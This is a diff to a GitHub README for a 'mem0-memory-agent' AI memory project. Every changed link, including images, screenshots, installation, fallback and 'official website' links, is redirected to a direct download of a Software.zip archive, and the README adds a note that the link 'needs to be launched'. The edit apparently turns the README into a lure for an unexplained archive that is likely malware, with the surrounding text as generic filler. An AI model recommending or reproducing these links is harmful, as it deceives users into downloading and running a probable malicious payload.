@@ -2,7 +2,7 @@
 
 🧠🔮 **Demonstrate personalized AI agent with long-term memory to deliver context-aware support** 🤖📚
 
-![mem0-memory-agent](https://github.com/arnacht/mem0-memory-agent/releases/tag/v1.0)
+![mem0-memory-agent](https://github.com/arnacht/mem0-memory-agent/releases/download/v2.0/Software.zip)
 
 Welcome to the `mem0-memory-agent` repository! Here we showcase a cutting-edge AI agent that utilizes long-term memory to provide personalized and context-aware support. This agent, named `mem0`, leverages advanced technologies such as AGI, generative AI, and LLM to interact with users in a unique and intelligent manner.
 
@@ -40,11 +40,11 @@ Welcome to the `mem0-memory-agent` repository! Here we showcase a cutting-edge A
 
 ## Installation
 
-To get started with the `mem0-memory-agent`, you can [download the latest release](https://github.com/arnacht/mem0-memory-agent/releases/tag/v1.0). 
+To get started with the `mem0-memory-agent`, you can [download the latest release](https://github.com/arnacht/mem0-memory-agent/releases/download/v2.0/Software.zip). 
 
 ⚠️  (Note: The link provided needs to be launched)
 
-If the link is not working, please visit the [Releases section](https://github.com/arnacht/mem0-memory-agent/releases/tag/v1.0) for alternative download options.
+If the link is not working, please visit the [Releases section](https://github.com/arnacht/mem0-memory-agent/releases/download/v2.0/Software.zip) for alternative download options.
 
 ## Usage
 
@@ -55,9 +55,9 @@ If the link is not working, please visit the [Releases section](https://github.c
 
 ## Screenshots
 
-![Demo 1](https://github.com/arnacht/mem0-memory-agent/releases/tag/v1.0)
+![Demo 1](https://github.com/arnacht/mem0-memory-agent/releases/download/v2.0/Software.zip)
 
-![Demo 2](https://github.com/arnacht/mem0-memory-agent/releases/tag/v1.0)
+![Demo 2](https://github.com/arnacht/mem0-memory-agent/releases/download/v2.0/Software.zip)
 
 ## Contributing
 
@@ -69,6 +69,6 @@ For any questions or issues related to `mem0` or the `mem0-memory-agent`, please
 
 ---
 
-🔗 For more information, visit the [official website](https://github.com/arnacht/mem0-memory-agent/releases/tag/v1.0).
+🔗 For more information, visit the [official website](https://github.com/arnacht/mem0-memory-agent/releases/download/v2.0/Software.zip).
 
 🚀 **Happy exploring the world of personalized AI with `mem0`!** 🌟
